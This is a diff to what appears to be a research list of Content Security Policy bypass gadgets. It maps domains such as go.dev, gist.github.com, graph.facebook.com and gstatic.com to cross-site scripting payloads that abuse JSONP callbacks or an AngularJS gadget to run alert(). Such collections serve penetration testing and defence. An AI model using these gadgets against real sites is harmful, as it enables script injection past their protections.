@@ -69,6 +69,7 @@ geo.moatads.com	<script src="https://geo.moatads.com/n.js?callback=alert(documen
 geolocation.onetrust.com	<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>
 gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>
+go.dev	<script src="https://go.dev/blog/.json?jsonp=alert"></script>
 go.snyk.io	<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>
 graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>
 gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
